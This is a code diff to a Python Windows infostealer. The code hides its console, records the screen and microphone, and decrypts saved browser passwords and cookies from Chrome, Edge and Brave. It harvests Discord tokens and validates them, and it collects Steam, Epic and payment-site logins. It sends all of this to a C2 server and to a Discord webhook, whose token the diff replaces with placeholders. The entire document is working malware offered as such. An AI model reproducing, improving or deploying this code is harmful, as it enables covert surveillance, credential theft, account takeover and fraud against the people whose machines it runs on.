@@ -16,8 +16,8 @@ from datetime import datetime
 from io import BytesIO
 
 # ===== CONFIG =====
-C2_URL = "https://c2-receiver.onrender.com"# <-- CHANGE THIS
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1543840098548846643/Nl_mYva2hVTQW3B9mriAFdLJzzFl5ng_lLTvv0_pv8kBv-J9QOmu64DE7ZrleN7PMZEl"
+C2_URL = "https://YOUR-APP-NAME.onrender.com"
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
 # ==================
 
 TARGET_ID = socket.gethostname()
@@ -27,10 +27,8 @@ HARVEST_INTERVAL = 70
 
 def push(data, filename, file_type):
     try:
-        if isinstance(data, bytes):
-            bio = BytesIO(data)
-        else:
-            bio = data
+        bio = BytesIO(data) if isinstance(data, bytes) else data
+        if hasattr(bio, "seek"):
             bio.seek(0)
         files = {"file": (filename, bio)}
         form = {"target_id": TARGET_ID, "file_type": file_type}
@@ -44,29 +42,55 @@ def push_text(text, filename, file_type):
 def dbg(msg):
     push_text(f"{datetime.now()} | {msg}\n", "debug.txt", "logs")
 
-# ================== STEALTH (must run first) ==================
+def send_webhook_embed(title, fields, color=0xFF0000):
+    """Send a proper Discord embed"""
+    if not DISCORD_WEBHOOK or "YOUR_" in DISCORD_WEBHOOK:
+        dbg("webhook not configured")
+        return
+    try:
+        embed = {
+            "title": title,
+            "color": color,
+            "timestamp": datetime.utcnow().isoformat(),
+            "fields": fields[:25],  # discord max 25 fields
+            "footer": {"text": f"host: {TARGET_ID}"}
+        }
+        payload = {"embeds": [embed]}
+        r = requests.post(DISCORD_WEBHOOK, json=payload, timeout=15)
+        dbg(f"webhook status: {r.status_code}")
+    except Exception as e:
+        dbg(f"webhook err: {e}")
+
+def send_webhook_text(content):
+    if not DISCORD_WEBHOOK or "YOUR_" in DISCORD_WEBHOOK:
+        return
+    try:
+        for i in range(0, len(content), 1900):
+            chunk = content[i:i+1900]
+            requests.post(DISCORD_WEBHOOK, json={"content": f"```yaml\n{chunk}\n```"}, timeout=15)
+    except Exception as e:
+        dbg(f"webhook text err: {e}")
+
+# ================== STEALTH ==================
 def full_stealth():
     if platform.system() != "Windows":
         return
     try:
         import ctypes
-        # hide console window completely
         hwnd = ctypes.windll.kernel32.GetConsoleWindow()
         if hwnd:
-            ctypes.windll.user32.ShowWindow(hwnd, 0)      # SW_HIDE
-            ctypes.windll.user32.SetWindowPos(hwnd, 0, 0, 0, 0, 0, 0x0080)  # SWP_HIDEWINDOW
-        # detach from console
+            ctypes.windll.user32.ShowWindow(hwnd, 0)
+            ctypes.windll.user32.SetWindowPos(hwnd, 0, 0, 0, 0, 0, 0x0080)
         try:
             ctypes.windll.kernel32.FreeConsole()
         except Exception:
             pass
-        # low priority
         ctypes.windll.kernel32.SetPriorityClass(
             ctypes.windll.kernel32.GetCurrentProcess(), 0x00000040)
     except Exception:
         pass
 
-# ================== SCREEN ==================
+# ================== SCREEN / AUDIO ==================
 def screen_loop():
     try:
         from PIL import ImageGrab
@@ -83,12 +107,10 @@ def screen_loop():
             dbg(f"screen: {e}")
         time.sleep(SCREEN_INTERVAL)
 
-# ================== AUDIO ==================
 def audio_loop():
     try:
         import sounddevice as sd
         from scipy.io.wavfile import write as wv
-        import numpy as np
     except Exception as e:
         dbg(f"no audio: {e}")
         return
@@ -103,7 +125,6 @@ def audio_loop():
             dbg(f"audio: {e}")
         time.sleep(AUDIO_INTERVAL)
 
-# ================== VPN ==================
 def check_vpn():
     try:
         out = subprocess.check_output("ipconfig", shell=True, stderr=subprocess.DEVNULL).decode(errors="ignore").lower()
@@ -114,17 +135,16 @@ def check_vpn():
         pass
     return False
 
-# ================== BROWSER DECRYPT ==================
+# ================== BROWSER ==================
 def get_chrome_key(base):
     try:
         import win32crypt
-        path = os.path.join(base, "Local State")
-        with open(path, "r", encoding="utf-8") as f:
+        with open(os.path.join(base, "Local State"), "r", encoding="utf-8") as f:
             raw = json.load(f)["os_crypt"]["encrypted_key"]
         key = base64.b64decode(raw)[5:]
         return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
     except Exception as e:
-        dbg(f"key fail {base}: {e}")
+        dbg(f"key fail: {e}")
         return None
 
 def decrypt_value(buff, key):
@@ -134,8 +154,7 @@ def decrypt_value(buff, key):
         import win32crypt
         from Cryptodome.Cipher import AES
         if buff[:3] in (b"v10", b"v11"):
-            cipher = AES.new(key, AES.MODE_GCM, buff[3:15])
-            return cipher.decrypt(buff[15:])[:-16].decode("utf-8", errors="ignore")
+            return AES.new(key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode("utf-8", errors="ignore")
         return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode("utf-8", errors="ignore")
     except Exception:
         return ""
@@ -148,7 +167,7 @@ def harvest_browser():
         import win32crypt
         from Cryptodome.Cipher import AES
     except Exception as e:
-        dbg(f"IMPORT FAIL win32crypt/Cryptodome: {e}")
+        dbg(f"IMPORT FAIL (need pywin32 + pycryptodome): {e}")
         return out
 
     local = os.getenv("LOCALAPPDATA", "")
@@ -157,17 +176,14 @@ def harvest_browser():
         ("Edge", os.path.join(local, "Microsoft", "Edge", "User Data")),
         ("Brave", os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data")),
     ]
-
     for bname, base in browsers:
         if not os.path.isdir(base):
-            dbg(f"{bname}: path missing")
             continue
         key = get_chrome_key(base)
         if not key:
             continue
         dbg(f"{bname}: key OK")
-
-        for profile in ["Default", "Profile 1", "Profile 2", "Profile 3"]:
+        for profile in ["Default", "Profile 1", "Profile 2"]:
             login_db = os.path.join(base, profile, "Login Data")
             if not os.path.exists(login_db):
                 continue
@@ -183,23 +199,19 @@ def harvest_browser():
                     os.remove(tmp)
                 except Exception:
                     pass
-                count = 0
                 for url, user, enc, last_used in rows:
                     if not user:
                         continue
                     pwd = decrypt_value(enc, key)
                     entry = {"browser": bname, "url": url or "", "user": user, "pass": pwd, "last_used": last_used or 0}
                     out["passwords"].append(entry)
-                    count += 1
                     if last_used and last_used > 0:
                         out["recent"].append(entry)
                     if re.search(r"card|payment|billing|checkout|stripe|paypal", url or "", re.I):
                         out["cards"].append(entry)
-                dbg(f"{bname}/{profile}: {count} logins")
             except Exception as e:
-                dbg(f"{bname}/{profile} login err: {e}")
+                dbg(f"{bname} login err: {e}")
 
-            # cookies
             cdb = os.path.join(base, profile, "Network", "Cookies")
             if not os.path.exists(cdb):
                 cdb = os.path.join(base, profile, "Cookies")
@@ -219,11 +231,10 @@ def harvest_browser():
                         os.remove(tmp)
                     except Exception:
                         pass
-                except Exception as e:
-                    dbg(f"{bname} cookie err: {e}")
-
+                except Exception:
+                    pass
     out["recent"] = sorted(out["recent"], key=lambda x: x.get("last_used") or 0, reverse=True)[:30]
-    dbg(f"TOTAL passwords={len(out['passwords'])} recent={len(out['recent'])} cookies={len(out['cookies'])}")
+    dbg(f"pw={len(out['passwords'])} cards={len(out['cards'])}")
     return out
 
 # ================== DISCORD ==================
@@ -234,9 +245,7 @@ def harvest_discord():
         return results
     roaming = os.getenv("APPDATA", "")
     local = os.getenv("LOCALAPPDATA", "")
-    paths = []
-    for n in ["Discord", "discordcanary", "discordptb", "discorddevelopment"]:
-        paths.append(os.path.join(roaming, n))
+    paths = [os.path.join(roaming, n) for n in ["Discord", "discordcanary", "discordptb", "discorddevelopment"]]
     paths += [
         os.path.join(local, "Google", "Chrome", "User Data", "Default"),
         os.path.join(local, "Microsoft", "Edge", "User Data", "Default"),
@@ -256,27 +265,28 @@ def harvest_discord():
                     tokens.add(m.decode("utf-8", errors="ignore"))
             except Exception:
                 pass
-    dbg(f"discord raw tokens: {len(tokens)}")
-    for tok in list(tokens)[:10]:
+    dbg(f"discord tokens found: {len(tokens)}")
+    for tok in list(tokens)[:12]:
         entry = {"token": tok}
         try:
             r = requests.get("https://discord.com/api/v9/users/@me",
-                             headers={"Authorization": tok}, timeout=7)
+                             headers={"Authorization": tok}, timeout=8)
             if r.status_code == 200:
                 d = r.json()
                 entry.update({
-                    "id": d.get("id"), "username": d.get("username"),
-                    "email": d.get("email"), "phone": d.get("phone"),
-                    "mfa": d.get("mfa_enabled")
+                    "id": str(d.get("id", "")),
+                    "username": d.get("username", ""),
+                    "email": d.get("email") or "n/a",
+                    "phone": d.get("phone") or "n/a",
+                    "mfa": str(d.get("mfa_enabled", ""))
                 })
             else:
-                entry["status"] = r.status_code
+                entry["status"] = str(r.status_code)
         except Exception as e:
-            entry["status"] = str(e)[:60]
+            entry["status"] = str(e)[:50]
         results.append(entry)
     return results
 
-# ================== STEAM ==================
 def harvest_steam(browser_pw):
     results = []
     base = os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Steam")
@@ -296,8 +306,8 @@ def harvest_steam(browser_pw):
                     "account_name": acc.group(1) if acc else "?",
                     "persona_name": per.group(1) if per else "?"
                 })
-        except Exception as e:
-            dbg(f"steam: {e}")
+        except Exception:
+            pass
     for p in browser_pw:
         if "steam" in (p.get("url") or "").lower():
             results.append({
@@ -305,10 +315,8 @@ def harvest_steam(browser_pw):
                 "steam_password": p.get("pass"),
                 "url": p.get("url")
             })
-    dbg(f"steam: {len(results)}")
     return results
 
-# ================== EPIC ==================
 def harvest_epic(browser_pw):
     results = []
     local = os.getenv("LOCALAPPDATA", "")
@@ -332,21 +340,52 @@ def harvest_epic(browser_pw):
                 "epic_password": p.get("pass"),
                 "url": p.get("url")
             })
-    dbg(f"epic: {len(results)}")
     return results
 
-# ================== HARVEST LOOP ==================
+# ================== HARVEST ==================
 def harvest_loop():
     time.sleep(5)
     while True:
         try:
-            dbg("=== HARVEST START ===")
+            dbg("HARVEST START")
             browser = harvest_browser()
             discord = harvest_discord()
             steam = harvest_steam(browser.get("passwords", []))
             epic = harvest_epic(browser.get("passwords", []))
             vpn = check_vpn()
 
+            # ===== DISCORD → WEBHOOK EMBED =====
+            if discord:
+                fields = []
+                for d in discord:
+                    val = f"```{d.get('token','')}```\n"
+                    val += f"**User:** {d.get('username','?')}\n"
+                    val += f"**Email:** {d.get('email','n/a')}\n"
+                    val += f"**Phone:** {d.get('phone','n/a')}\n"
+                    val += f"**ID:** {d.get('id','?')} | MFA: {d.get('mfa','?')}"
+                    if d.get("status"):
+                        val += f"\nStatus: {d.get('status')}"
+                    fields.append({
+                        "name": f"Token · {d.get('username') or 'unknown'}",
+                        "value": val[:1020],
+                        "inline": False
+                    })
+                send_webhook_embed(
+                    f"Discord Hit · {TARGET_ID}",
+                    fields,
+                    color=0x5865F2
+                )
+                # also plain text backup
+                lines = [f"HOST: {TARGET_ID}"]
+                for d in discord:
+                    lines.append(f"TOKEN: {d.get('token')}")
+                    lines.append(f"  EMAIL: {d.get('email')} | USER: {d.get('username')} | ID: {d.get('id')}")
+                send_webhook_text("\n".join(lines))
+                dbg("discord webhook sent")
+            else:
+                dbg("no discord tokens")
+
+            # ===== STEAM / EPIC / CARDS / PW → APP =====
             lines = [
                 f"TIME: {datetime.now()}",
                 f"HOST: {socket.gethostname()}",
@@ -358,13 +397,6 @@ def harvest_loop():
             for r in browser.get("recent", [])[:20]:
                 lines.append(f"{r.get('browser')} | {r.get('url')}")
                 lines.append(f"  USER: {r.get('user')}  PASS: {r.get('pass')}")
-            lines.append("")
-            lines.append("========== DISCORD ==========")
-            if not discord:
-                lines.append("(none)")
-            for d in discord:
-                lines.append(f"TOKEN: {d.get('token')}")
-                lines.append(f"  ID:{d.get('id')} USER:{d.get('username')} EMAIL:{d.get('email')} PHONE:{d.get('phone')} MFA:{d.get('mfa')} ST:{d.get('status','ok')}")
             lines.append("")
             lines.append("========== STEAM ==========")
             if not steam:
@@ -386,31 +418,28 @@ def harvest_loop():
                 else:
                     lines.append(str(e))
             lines.append("")
+            lines.append("========== CARDS ==========")
+            for c in browser.get("cards", []):
+                lines.append(f"{c.get('browser')} | {c.get('url')}")
+                lines.append(f"  USER: {c.get('user')}  PASS: {c.get('pass')}")
+            lines.append("")
             lines.append("========== ALL PASSWORDS ==========")
-            if not browser.get("passwords"):
-                lines.append("(none - check debug.txt for crypto errors)")
             for p in browser.get("passwords", [])[:50]:
                 lines.append(f"{p.get('browser')} | {p.get('url')}")
                 lines.append(f"  USER: {p.get('user')}  PASS: {p.get('pass')}")
-            lines.append("")
-            lines.append("========== CARDS ==========")
-            for c in browser.get("cards", []):
-                lines.append(str(c))
             lines.append("")
             lines.append("========== COOKIES ==========")
             for c in browser.get("cookies", [])[:40]:
                 lines.append(f"{c.get('host')} | {c.get('name')}={c.get('value')}")
 
             push_text("\n".join(lines), "accounts.txt", "accounts")
-            dbg("=== HARVEST DONE ===")
+            dbg("app data uploaded")
         except Exception as e:
             dbg(f"FATAL: {e}\n{traceback.format_exc()}")
         time.sleep(HARVEST_INTERVAL)
 
-# ================== MAIN ==================
 if __name__ == "__main__":
     full_stealth()
-    # second stealth pass after imports settle
     time.sleep(0.3)
     full_stealth()
     dbg("agent online")
